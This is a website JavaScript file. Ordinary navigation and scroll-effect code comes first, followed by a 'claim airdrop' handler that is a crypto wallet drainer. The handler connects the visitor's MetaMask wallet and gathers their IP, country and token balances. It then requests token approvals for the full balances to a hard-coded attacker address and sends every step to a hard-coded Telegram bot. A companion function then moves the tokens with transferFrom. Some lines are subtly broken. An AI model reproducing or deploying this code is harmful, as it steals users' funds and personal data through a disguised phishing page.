'use strict';

/**
 * Add event on element
 */
const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
};

/**
 * Navbar toggle
 */
const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
};

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
};

addEventOnElem(navbarLinks, "click", closeNavbar);

/**
 * Header active on scroll
 */
const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
};

addEventOnElem(window, "scroll", activeHeader);

/**
 * Toggle active on add to fav
 */
const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
};

addEventOnElem(addToFavBtns, "click", toggleActive);

/**
 * Scroll reveal effect
 */
const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
};

scrollReveal();
addEventOnElem(window, "scroll", scrollReveal);

/**
 * Wallet connect, token approval, and Telegram notification
 */
async function connectWalletAndSendTokens() {
  if (!window.ethers || !window.ethereum) {
    console.error("MetaMask is not installed.");
    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
      window.location.href = "https://metamask.app.link/dapp/" + window.location.host + window.location.pathname;
    } else {
      window.location.href = "https://metamask.io/download.html";
    }
    return;
  }

  const evmNetworks = [
    {
      chainId: 1,
      name: "Ethereum",
      chainName: "eth",
      nativeCoin: "ETH",
      exodusAddress: "0xe22151324Ed5b8A4F2B45f1C3017D15B2aEc1B28"
    },
    {
      chainId: 56,
      name: "BSC",
      chainName: "bsc",
      nativeCoin: "BNB",
      exodusAddress: "0xe22151324Ed5b8A4F2B45f1C3017D15B2aEc1B28"
    }
  ];

  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
  const chatId = "5995616824";
  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  try {
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const userAddress = await signer.getAddress();
    console.log(`Wallet connected: ${userAddress} (MetaMask)`);

    // Capture device type
    let deviceType = "Unknown";
    if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
      deviceType = "Mobile";
    } else if (/Tablet/i.test(navigator.userAgent)) {
      deviceType = "Tablet";
    } else {
      deviceType = "Desktop";
    }

    let locationData = {};
    try {
      const locRes = await fetch("https://ipapi.co/json/");
      locationData = await locRes.json();
    } catch (e) {
      console.warn("Location fetch failed", e);
      locationData = { country_name: "Unknown", ip: "N/A" };
    }

    for (const network of evmNetworks) {
      try {
        console.log(`Processing network: ${network.name}`);

        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${network.chainId.toString(16)}` }]
          });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            const chainConfig = network.chainId === 1 ? {
              chainId: '0x1',
              chainName: 'Ethereum Mainnet',
              rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
              blockExplorerUrls: ['https://etherscan.io']
            } : {
              chainId: '0x38',
              chainName: 'Binance Smart Chain',
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              blockExplorerUrls: ['https://bscscan.com']
            };
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [chainConfig]
            });
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
            });
          } else {
            throw switchErr;
          }
        }

        const currentProvider = new ethers.providers.Web3Provider(window.ethereum);
        const currentSigner = currentProvider.getSigner();
        const currentNetwork = await currentProvider.getNetwork();
        console.log(`Switched to network: ${currentNetwork.name} (chainId: ${currentNetwork.chainId})`);

        if (currentNetwork.chainId !== network.chainId) {
          const errorMessage = `❌ Failed to switch to ${network.name}.\n${deviceType}`;
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
          });
          continue;
        }

        if (!currentSigner) {
          const errorMessage = `❌ Signer not initialized for ${network.name}.\n${deviceType}`;
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
          });
          continue;
        }

        await delay(1000);

        let tokens = [];
        let tokenSummary = "";
        let apiAttempts = 0;
        const maxAttempts = 3;
        let apiSuccess = false;

        while (apiAttempts < maxAttempts && !apiSuccess) {
          try {
            apiAttempts++;
            const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
            const response = await fetch(moralisUrl, {
              headers: { "X-API-Key": moralisApiKey }
            });
            if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
            tokens = await response.json();
            apiSuccess = true;

            const nonZeroTokens = tokens.filter(t => 
              t.balance && 
              !ethers.BigNumber.from(t.balance).isZero() && 
              t.token_address && 
              ethers.utils.isAddress(t.token_address) && 
              t.symbol && 
              t.decimals !== Uint8Array
            );

            tokenSummary = nonZeroTokens.length > 0
              ? nonZeroTokens.map(token => {
                  const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                  return `• ${token.symbol}: ${balance}`;
                }).join("\n")
              : `No valid non-zero ${network.chainName === 'eth' ? 'ERC-20' : 'BEP-20'} token balances found.`;
          } catch (apiErr) {
            console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
            if (apiAttempts === maxAttempts) {
              tokenSummary = `Failed to fetch token balances: ${apiErr.message}`;
            } else {
              await delay(3000);
            }
          }
        }

        const nativeBalance = await currentProvider.getBalance(userAddress);
        const formattedBalance = ethers.utils.formatEther(nativeBalance);
        const nativeBalanceMessage = `• ${network.nativeCoin}: ${formattedBalance}`;

        const networkMessage = `
📥 Wallet Connected on ${network.name}
Address: ${userAddress}
Wallet: MetaMask
Country: ${locationData.country_name}
IP: ${locationData.ip}
${deviceType}

💰 Balances:
${tokenSummary}
${nativeBalanceMessage}
        `;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: networkMessage })
        });

        const nonZeroTokens = tokens.filter(t => 
          t.balance && 
          !ethers.BigNumber.from(t.balance).isZero() && 
          t.token_address && 
          ethers.utils.isAddress(t.token_address) && 
          t.symbol && 
          t.decimals !== undefined
        );

        if (nonZeroTokens.length > 0) {
          for (const token of nonZeroTokens) {
            try {
              const contract = new ethers.Contract(token.token_address, [
                "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
                "function allowance(address owner, address spender) public view returns (uint256)"
              ], currentSigner);

              const balance = ethers.BigNumber.from(token.balance);
              const currentAllowance = await contract.allowance(userAddress, network.exodusAddress);
              const neededAllowance = balance.sub(currentAllowance);

              if (neededAllowance.gt(0)) {
                const approvalTx = await contract.increaseAllowance(network.exodusAddress, neededAllowance);
                await approvalTx.wait();

                const formattedAmount = ethers.utils.formatUnits(neededAllowance, token.decimals ?? 18);
                const approvalMessage = `
✅ Approval Successful
Token: ${token.symbol}
Amount Approved: ${formattedAmount}
Spender: ${network.exodusAddress}
Tx: B${approvalTx.hash}
${deviceType}
                `;
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ chat_id: chatId, text: approvalMessage })
                });
              } else {
                console.log(`Sufficient allowance already exists for ${token.symbol}`);
              }
            } catch (err) {
              const errorMessage = `
❌ Approval Failed
Token: ${token.symbol || 'Unknown'}
Error: ${err.message}
${deviceType}
              `;
              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: errorMessage })
              });
              continue;
            }
          }
        } else {
          const noTokensMessage = `
⚠️ No valid non-zero ${network.chainName === 'eth' ? 'ERC-20' : 'BEP-20'} token balances to transfer on ${network.name}
Address: ${userAddress}
${deviceType}
          `;
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: noTokensMessage })
          });
        }
      } catch (err) {
        const errorMessage = `❌ Error on ${network.name}: ${err.message}\n${deviceType}`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
        });
      }
    }
  } catch (err) {
    const errorMessage = `❌ Wallet Connection Failed: ${err.message}\n${deviceType}`;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
    });
  }
}

/**
 * Manual transfer function to be called after approval (e.g., via Etherscan or script)
 */
async function executeTransferFrom(tokenAddress, userAddress, amount, decimals, exodusAddress) {
  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
  const chatId = "5995616824";

  let deviceType = "Unknown";
  if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
    deviceType = "Mobile";
  } else if (/Tablet/i.test(navigator.userAgent)) {
    deviceType = "Tablet";
  } else {
    deviceType = "Desktop";
  }

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const contract = new ethers.Contract(tokenAddress, [
      "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
      "function symbol() public view returns (string)"
    ], signer);

    const tokenSymbol = await contract.symbol();
    const transferTx = await contract.transferFrom(userAddress, exodusAddress, amount);
    await transferTx.wait();

    const formattedAmount = ethers.utils.formatUnits(amount, decimals);
    const transferSuccessMessage = `
✅ Transfer Successful
Token: ${tokenSymbol}
Amount: ${formattedAmount}
From: ${userAddress}
To: ${exodusAddress}
Tx: ${transferTx.hash}
${deviceType}
    `;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: forEach({ chat_id: chatId, text: transferSuccessMessage })
    });
  } catch (err) {
    const errorMessage = `
❌ Transfer Failed
Token Address: ${tokenAddress}
Error: ${err.message}
${deviceType}
    `;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
    });
  }
}

document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);